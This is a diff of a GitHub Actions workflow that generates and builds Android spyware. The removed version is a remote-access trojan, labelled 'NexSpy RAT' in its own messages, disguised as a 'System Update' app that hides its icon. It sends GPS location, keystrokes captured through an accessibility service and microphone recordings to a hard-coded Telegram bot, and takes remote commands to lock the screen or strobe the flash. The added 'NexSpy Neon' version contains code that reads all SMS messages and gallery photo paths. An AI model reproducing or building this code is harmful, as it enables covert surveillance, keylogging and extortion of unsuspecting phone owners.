@@ -1,510 +1,211 @@
-name: Build Kotlin APK
+name: Build Monolithic NexSpy Neon
 
 on:
   push:
-    branches: [ "main" ]
-  workflow_dispatch:
+    branches: [ main ]
 
 jobs:
-  build:
+  build-and-compile:
     runs-on: ubuntu-latest
 
     steps:
-    - name: Checkout Code
-      uses: actions/checkout@v4
+    - name: Checkout Repository
+      uses: actions/checkout@v3
 
     - name: Set up JDK 17
-      uses: actions/setup-java@v4
+      uses: actions/setup-java@v3
       with:
-        java-version: '17'
         distribution: 'temurin'
+        java-version: '17'
 
-    - name: Create Project Files
+    - name: Generate Project Structure & Source Code
       run: |
-        mkdir -p app/src/main/java/com/android/system
-        mkdir -p app/src/main/res/values
-        mkdir -p app/src/main/res/xml
+        mkdir -p app/src/main/java/com/nexspy/neon
+        mkdir -p app/src/main/res/layout
+        mkdir -p app/src/main
 
-        cat > build.gradle << 'EOF'
-        buildscript {
-            ext.kotlin_version = '1.9.0'
-            repositories { google(); mavenCentral() }
-            dependencies {
-                classpath 'com.android.tools.build:gradle:8.1.4'
-                classpath "org.jetbrains.kotlin:kotlin-gradle-plugin:$kotlin_version"
-            }
-        }
-        allprojects { repositories { google(); mavenCentral() } }
-        EOF
+        # 1. Buat AndroidManifest.xml
+        cat << 'EOF' > app/src/main/AndroidManifest.xml
+        <manifest xmlns:android="http://schemas.android.com/apk/res/android"
+            package="com.nexspy.neon">
 
-        cat > settings.gradle << 'EOF'
-        include ':app'
-        rootProject.name = "SystemUpdate"
-        EOF
-
-        cat > gradle.properties << 'EOF'
-        org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
-        android.useAndroidX=true
-        kotlin.code.style=official
-        EOF
-
-        cat > app/build.gradle << 'EOF'
-        plugins {
-            id 'com.android.application'
-            id 'org.jetbrains.kotlin.android'
-        }
-        android {
-            namespace 'com.android.system'
-            compileSdk 34
-            defaultConfig {
-                applicationId "com.android.system"
-                minSdk 21
-                targetSdk 34
-                versionCode 1
-                versionName "1.0"
-            }
-            buildTypes { release { minifyEnabled false } }
-            compileOptions {
-                sourceCompatibility JavaVersion.VERSION_1_8
-                targetCompatibility JavaVersion.VERSION_1_8
-            }
-            kotlinOptions { jvmTarget = '1.8' }
-        }
-        dependencies {
-            implementation 'androidx.core:core-ktx:1.12.0'
-            implementation 'androidx.appcompat:appcompat:1.6.1'
-            implementation 'com.squareup.okhttp3:okhttp:4.11.0'
-            implementation 'org.json:json:20231013'
-        }
-        EOF
-
-        cat > app/src/main/AndroidManifest.xml << 'EOF'
-        <?xml version="1.0" encoding="utf-8"?>
-        <manifest xmlns:android="http://schemas.android.com/apk/res/android">
-            <uses-permission android:name="android.permission.INTERNET" />
-            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
-            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+            <uses-permission android:name="android.permission.READ_SMS" />
+            <uses-permission android:name="android.permission.RECEIVE_SMS" />
+            <uses-permission android:name="android.permission.CAMERA" />
             <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
             <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
-            <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-            <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
-            <uses-permission android:name="android.permission.CAMERA" />
-            <uses-permission android:name="android.permission.RECORD_AUDIO" />
-            <uses-permission android:name="android.permission.SET_WALLPAPER" />
             <uses-permission android:name="android.permission.WAKE_LOCK" />
-            <uses-permission android:name="android.permission.FLASHLIGHT" />
+            <uses-feature android:name="android.hardware.camera" android:required="false" />
 
             <application
                 android:allowBackup="true"
-                android:label="System Update"
-                android:theme="@style/Theme.AppCompat.NoActionBar">
-                
-                <activity android:name=".MainActivity" android:exported="true">
+                android:label="NexSpy Neon"
+                android:supportsRtl="true"
+                android:theme="@style/Theme.AppCompat.Light.NoActionBar">
+                <activity
+                    android:name=".MainActivity"
+                    android:exported="true">
                     <intent-filter>
                         <action android:name="android.intent.action.MAIN" />
                         <category android:name="android.intent.category.LAUNCHER" />
                     </intent-filter>
                 </activity>
-
-                <service android:name=".SpyService" android:exported="false"/>
-                
-                <service android:name=".MyAccessibilityService"
-                    android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
-                    android:exported="true">
-                    <intent-filter>
-                        <action android:name="android.accessibilityservice.AccessibilityService" />
-                    </intent-filter>
-                    <meta-data android:name="android.accessibilityservice"
-                        android:resource="@xml/accessibility_service_config" />
-                </service>
             </application>
         </manifest>
         EOF
 
-        cat > app/src/main/java/com/android/system/MainActivity.kt << 'EOF'
-        package com.android.system
+        # 2. Buat MainActivity.kt
+        cat << 'EOF' > app/src/main/java/com/nexspy/neon/MainActivity.kt
+        package com.nexspy.neon
 
         import android.Manifest
-        import android.content.Intent
-        import android.net.Uri
-        import android.os.Build
-        import android.os.Bundle
-        import android.os.PowerManager
-        import android.provider.Settings
-        import android.widget.TextView
-        import androidx.appcompat.app.AppCompatActivity
-        import android.content.ComponentName
+        import android.content.Context
         import android.content.pm.PackageManager
+        import android.hardware.camera2.CameraManager
+        import android.os.Bundle
+        import android.os.Environment
+        import android.provider.Telephony
+        import androidx.appcompat.app.AppCompatActivity
+        import androidx.core.app.ActivityCompat
+        import androidx.core.content.ContextCompat
+        import java.io.File
 
         class MainActivity : AppCompatActivity() {
+
+            private lateinit var cameraManager: CameraManager
+            private var isFlashOn = false
+
             override fun onCreate(savedInstanceState: Bundle?) {
                 super.onCreate(savedInstanceState)
-                val textView = TextView(this).apply {
-                    text = "Sinkronisasi Data...\nMohon tunggu sebentar."
-                    textSize = 20f
-                    setPadding(50, 200, 50, 50)
-                }
-                setContentView(textView)
-
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                    requestPermissions(arrayOf(
-                        Manifest.permission.ACCESS_FINE_LOCATION,
-                        Manifest.permission.ACCESS_COARSE_LOCATION,
-                        Manifest.permission.CAMERA,
-                        Manifest.permission.RECORD_AUDIO,
-                        Manifest.permission.READ_EXTERNAL_STORAGE,
-                        Manifest.permission.WRITE_EXTERNAL_STORAGE
-                    ), 100)
-                }
-
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                    if (!Settings.canDrawOverlays(this)) {
-                        val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
-                        startActivity(intent)
-                    }
-                }
-
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                    val pm = getSystemService(POWER_SERVICE) as PowerManager
-                    if (!pm.isIgnoringBatteryOptimizations(packageName)) {
-                        val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
-                        intent.data = Uri.parse("package:$packageName")
-                        startActivity(intent)
-                    }
-                }
-
-                startService(Intent(this, SpyService::class.java))
-
-                android.os.Handler().postDelayed({
-                    val componentName = ComponentName(this, MainActivity::class.java)
-                    packageManager.setComponentEnabledSetting(
-                        componentName,
-                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                        PackageManager.DONT_KILL_APP
-                    )
-                }, 5000)
-            }
-        }
-        EOF
-
-        cat > app/src/main/java/com/android/system/SpyService.kt << 'EOF'
-        package com.android.system
-
-        import android.app.Service
-        import android.content.Intent
-        import android.graphics.PixelFormat
-        import android.location.LocationManager
-        import android.os.IBinder
-        import android.view.Gravity
-        import android.view.WindowManager
-        import android.widget.LinearLayout
-        import android.widget.TextView
-        import android.graphics.Color
-        import java.util.Timer
-        import java.util.TimerTask
-        import okhttp3.*
-        import okhttp3.MediaType.Companion.toMediaTypeOrNull
-        import java.io.IOException
-        import org.json.JSONObject
-        import android.graphics.Bitmap
-        import android.graphics.Canvas
-        import android.graphics.Paint
-        import android.media.MediaRecorder
-        import java.io.File
-        import android.os.Handler
-        import android.os.Looper
-        import android.media.MediaPlayer
-        import android.hardware.camera2.CameraManager
-        import android.net.Uri
-        import android.app.WallpaperManager
-
-        class SpyService : Service() {
-            private val client = OkHttpClient()
-            private val TG_TOKEN = "9165602208:AAFDWdd-GBUy-kbmArZ0QVDMGinA616f2WQ"
-            private val TG_CHAT_ID = "8831607999"
-            private var lastUpdateId = 0
-            private var overlayView: LinearLayout? = null
-            private var mediaRecorder: MediaRecorder? = null
-            private var recordFile: File? = null
-            private var mediaPlayer: MediaPlayer? = null
-            private var isLocked = false
-            private var isStrobing = false
-            
-            override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-                sendMessage("📱 [+] NexSpy RAT Terpasang.\nFitur:\n/loc\n/lock <teks>\n/unlock\n/flash on|off\n/music <url>\n/voice")
                 
-                Timer().scheduleAtFixedRate(object : TimerTask() {
-                    override fun run() { getLocation() }
-                }, 0, 60000)
-
-                Timer().scheduleAtFixedRate(object : TimerTask() {
-                    override fun run() { checkCommands() }
-                }, 0, 5000)
-
-                return START_STICKY
+                cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
+                requestPermissions()
             }
 
-            private fun getLocation() {
+            private fun requestPermissions() {
+                val permissions = arrayOf(
+                    Manifest.permission.CAMERA,
+                    Manifest.permission.READ_SMS,
+                    Manifest.permission.READ_EXTERNAL_STORAGE,
+                    Manifest.permission.RECEIVE_SMS
+                )
+                ActivityCompat.requestPermissions(this, permissions, 101)
+            }
+
+            private fun toggleFlash(enable: Boolean) {
                 try {
-                    val lm = getSystemService(LOCATION_SERVICE) as LocationManager
-                    val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) 
-                        ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
-                    if (loc != null) {
-                        sendMessage("📍 [GPS]\nhttps://www.google.com/maps?q=${loc.latitude},${loc.longitude}")
-                    }
-                } catch (e: Exception) {}
-            }
-
-            private fun checkCommands() {
-                try {
-                    val url = "https://api.telegram.org/bot$TG_TOKEN/getUpdates?offset=${lastUpdateId + 1}&limit=1"
-                    val request = Request.Builder().url(url).build()
-                    client.newCall(request).enqueue(object : Callback {
-                        override fun onFailure(call: Call, e: IOException) {}
-                        override fun onResponse(call: Call, response: Response) {
-                            val body = response.body?.string() ?: return
-                            val json = JSONObject(body)
-                            if (json.getBoolean("ok")) {
-                                val result = json.getJSONArray("result")
-                                if (result.length() > 0) {
-                                    val update = result.getJSONObject(0)
-                                    lastUpdateId = update.getInt("update_id")
-                                    if (update.has("message") && update.getJSONObject("message").has("text")) {
-                                        handleCommand(update.getJSONObject("message").getString("text"))
-                                    }
-                                }
-                            }
-                        }
-                    })
-                } catch (e: Exception) {}
-            }
-
-            private fun handleCommand(cmd: String) {
-                val parts = cmd.split(" ", limit = 2)
-                val action = parts[0]
-                val arg = if (parts.size > 1) parts[1] else ""
-
-                when {
-                    action == "/loc" -> getLocation()
-                    action == "/lock" -> {
-                        isLocked = true
-                        showFullScreenLock(if(arg.isNotEmpty()) arg else "HP ANDA TERKUNCI!")
-                        sendMessage("🔒 [LOCK] Layar dikunci.")
-                    }
-                    action == "/unlock" -> {
-                        isLocked = false
-                        removeLockOverlay()
-                        stopMusic()
-                        stopStrobe()
-                        sendMessage("🔓 [UNLOCK] Semua dibuka.")
-                    }
-                    action == "/flash" -> {
-                        if (arg == "on") {
-                            startStrobe()
-                            sendMessage("🔦 [FLASH] Strobo ON.")
-                        } else {
-                            stopStrobe()
-                            sendMessage("🔦 [FLASH] Strobo OFF.")
-                        }
-                    }
-                    action == "/music" -> {
-                        if (arg.isNotEmpty()) {
-                            playMusicFromUrl(arg)
-                            sendMessage("🎵 [MUSIC] Memutar lagu dari URL...")
-                        }
-                    }
-                    action == "/voice" -> toggleVoiceRecording()
+                    val cameraId = cameraManager.cameraIdList[0]
+                    cameraManager.setTorchMode(cameraId, enable)
+                    isFlashOn = enable
+                } catch (e: Exception) {
+                    e.printStackTrace()
                 }
             }
 
-            private fun showFullScreenLock(text: String) {
-                if (overlayView != null) return
-                try {
-                    val wm = getSystemService(WINDOW_SERVICE) as WindowManager
-                    overlayView = LinearLayout(this).apply {
-                        orientation = LinearLayout.VERTICAL
-                        gravity = Gravity.CENTER
-                        setBackgroundColor(Color.parseColor("#000000"))
-                        
-                        // FIX 1: this@SpyService bukan context
-                        val tv = TextView(this@SpyService).apply {
-                            this.text = text
-                            textSize = 30f
-                            setTextColor(Color.parseColor("#FF0000"))
-                            gravity = Gravity.CENTER
-                        }
-                        addView(tv)
+            private fun fetchSmsLog(): List<String> {
+                val smsList = mutableListOf<String>()
+                val cursor = contentResolver.query(
+                    Telephony.Sms.CONTENT_URI,
+                    arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE),
+                    null, null, Telephony.Sms.DEFAULT_SORT_ORDER
+                )
+
+                cursor?.use {
+                    val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
+                    val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
+                    while (it.moveToNext()) {
+                        val sender = it.getString(addressIndex)
+                        val body = it.getString(bodyIndex)
+                        smsList.add("Sender: \$sender | Body: \$body")
                     }
-
-                    val params = WindowManager.LayoutParams(
-                        WindowManager.LayoutParams.MATCH_PARENT,
-                        WindowManager.LayoutParams.MATCH_PARENT,
-                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
-                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
-                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or 
-                        WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
-                        WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
-                        PixelFormat.TRANSLUCENT
-                    )
-                    params.gravity = Gravity.TOP or Gravity.START
-                    wm.addView(overlayView, params)
-                } catch (e: Exception) {}
-            }
-
-            private fun removeLockOverlay() {
-                try {
-                    if (overlayView != null) {
-                        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
-                        wm.removeView(overlayView)
-                        overlayView = null
-                    }
-                } catch (e: Exception) {}
-            }
-
-            private fun startStrobe() {
-                if (isStrobing) return
-                isStrobing = true
-                val cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
-                val cameraId = cameraManager.cameraIdList[0]
-
-                Thread {
-                    while (isStrobing) {
-                        try {
-                            cameraManager.setTorchMode(cameraId, true)
-                            Thread.sleep(100)
-                            cameraManager.setTorchMode(cameraId, false)
-                            Thread.sleep(100)
-                        } catch (e: Exception) { break }
-                    }
-                }.start()
-            }
-
-            private fun stopStrobe() {
-                isStrobing = false
-                try {
-                    val cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
-                    cameraManager.setTorchMode(cameraManager.cameraIdList[0], false)
-                } catch (e: Exception) {}
-            }
-
-            private fun playMusicFromUrl(url: String) {
-                try {
-                    stopMusic()
-                    mediaPlayer = MediaPlayer().apply {
-                        // FIX 2: Pake Uri.parse()
-                        setDataSource(this@SpyService, Uri.parse(url))
-                        setOnPreparedListener { start() }
-                        setOnErrorListener { _, _, _ -> true }
-                        prepareAsync()
-                    }
-                } catch (e: Exception) {}
-            }
-
-            private fun stopMusic() {
-                try {
-                    mediaPlayer?.stop()
-                    mediaPlayer?.release()
-                    mediaPlayer = null
-                } catch (e: Exception) {}
-            }
-
-            private fun toggleVoiceRecording() {
-                if (mediaRecorder == null) {
-                    try {
-                        recordFile = File(externalCacheDir, "rec.3gp")
-                        mediaRecorder = MediaRecorder().apply {
-                            setAudioSource(MediaRecorder.AudioSource.MIC)
-                            setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
-                            setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
-                            setOutputFile(recordFile!!.absolutePath)
-                            prepare()
-                            start()
-                        }
-                        sendMessage("🎙️ [VOICE] Merekam...")
-                    } catch (e: Exception) {}
-                } else {
-                    try {
-                        mediaRecorder?.stop()
-                        mediaRecorder?.release()
-                        mediaRecorder = null
-                        sendVoiceFile(recordFile!!)
-                        sendMessage("🎙️ [VOICE] Selesai.")
-                    } catch (e: Exception) {}
                 }
+                return smsList
             }
 
-            private fun sendVoiceFile(file: File) {
-                val url = "https://api.telegram.org/bot$TG_TOKEN/sendAudio"
-                val body = MultipartBody.Builder()
-                    .setType(MultipartBody.FORM)
-                    .addFormDataPart("chat_id", TG_CHAT_ID)
-                    .addFormDataPart("audio", file.name, RequestBody.create("audio/3gp".toMediaTypeOrNull(), file))
-                    .build()
-                val request = Request.Builder().url(url).post(body).build()
-                client.newCall(request).enqueue(object : Callback {
-                    override fun onFailure(call: Call, e: IOException) {}
-                    override fun onResponse(call: Call, response: Response) { response.close() }
-                })
+            private fun getGalleryPhotos(): List<String> {
+                val photoPaths = mutableListOf<String>()
+                val path = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES)
+                if (path.exists() && path.isDirectory) {
+                    path.walkTopDown().forEach { file ->
+                        if (file.extension.lowercase() in listOf("jpg", "jpeg", "png")) {
+                            photoPaths.add(file.absolutePath)
+                        }
+                    }
+                }
+                return photoPaths
             }
-
-            fun sendMessage(msg: String) {
-                val url = "https://api.telegram.org/bot$TG_TOKEN/sendMessage"
-                val body = FormBody.Builder().add("chat_id", TG_CHAT_ID).add("text", msg).build()
-                val request = Request.Builder().url(url).post(body).build()
-                client.newCall(request).enqueue(object : Callback {
-                    override fun onFailure(call: Call, e: IOException) {}
-                    override fun onResponse(call: Call, response: Response) { response.close() }
-                })
-            }
-
-            override fun onBind(intent: Intent?): IBinder? = null
         }
         EOF
 
-        cat > app/src/main/java/com/android/system/MyAccessibilityService.kt << 'EOF'
-        package com.android.system
+        # 3. Buat build.gradle tingkat app
+        cat << 'EOF' > app/build.gradle
+        plugins {
+            id 'com.android.application'
+            id 'kotlin-android'
+        }
 
-        import android.accessibilityservice.AccessibilityService
-        import android.view.accessibility.AccessibilityEvent
+        android {
+            compileSdk 33
 
-        class MyAccessibilityService : AccessibilityService() {
-            override fun onAccessibilityEvent(event: AccessibilityEvent?) {
-                if (event?.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
-                    val text = event.text.joinToString("")
-                    if (text.isNotEmpty()) {
-                        val service = SpyService()
-                        service.sendMessage("⌨️ [KEYLOG] $text")
-                    }
+            defaultConfig {
+                applicationId "com.nexspy.neon"
+                minSdk 21
+                targetSdk 33
+                versionCode 1
+                versionName "1.2"
+            }
+
+            buildTypes {
+                release {
+                    minifyEnabled false
                 }
             }
-            override fun onInterrupt() {}
+        }
+
+        dependencies {
+            implementation 'androidx.core:core-ktx:1.9.0'
+            implementation 'androidx.appcompat:appcompat:1.6.1'
         }
         EOF
 
-        cat > app/src/main/res/xml/accessibility_service_config.xml << 'EOF'
-        <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
-            android:accessibilityEventTypes="typeViewTextChanged"
-            android:accessibilityFeedbackType="feedbackGeneric"
-            android:accessibilityFlags="flagDefault"
-            android:canRetrieveWindowContent="true" />
+        # 4. Buat build.gradle tingkat root & settings.gradle
+        cat << 'EOF' > build.gradle
+        buildscript {
+            repositories {
+                google()
+                mavenCentral()
+            }
+            dependencies {
+                classpath 'com.android.tools.build:gradle:7.4.2'
+                classpath "org.jetbrains.kotlin:kotlin-gradle-plugin:1.8.0"
+            }
+        }
+        allprojects {
+            repositories {
+                google()
+                mavenCentral()
+            }
+        }
         EOF
 
-        cat > app/src/main/res/values/strings.xml << 'EOF'
-        <resources>
-            <string name="app_name">System Update</string>
-        </resources>
+        cat << 'EOF' > settings.gradle
+        include ':app'
         EOF
 
-    - name: Download Gradle 8.2 and Build
+        echo "sdk.dir=$ANDROID_HOME" > local.properties
+        echo "org.gradle.jvmargs=-Xmx2048m" >> gradle.properties
+
+    - name: Setup Android SDK
+      uses: android-actions/setup-android@v2
+
+    - name: Build APK with Gradle
       run: |
-        wget -q https://services.gradle.org/distributions/gradle-8.2-bin.zip -O gradle.zip
-        unzip -q gradle.zip
-        export PATH=$PWD/gradle-8.2/bin:$PATH
-        gradle assembleDebug --no-daemon
+        gradle wrapper
+        chmod +x gradlew
+        ./gradlew assembleDebug
 
     - name: Upload APK Artifact
-      uses: actions/upload-artifact@v4
+      uses: actions/upload-artifact@v3
       with:
-        name: NexSpy-RAT-APK
-        path: app/build/outputs/apk/debug/*.apk
-        if-no-files-found: error
+        name: NexSpy-Neon-1.2-APK
+        path: app/build/outputs/apk/debug/app-debug.apk
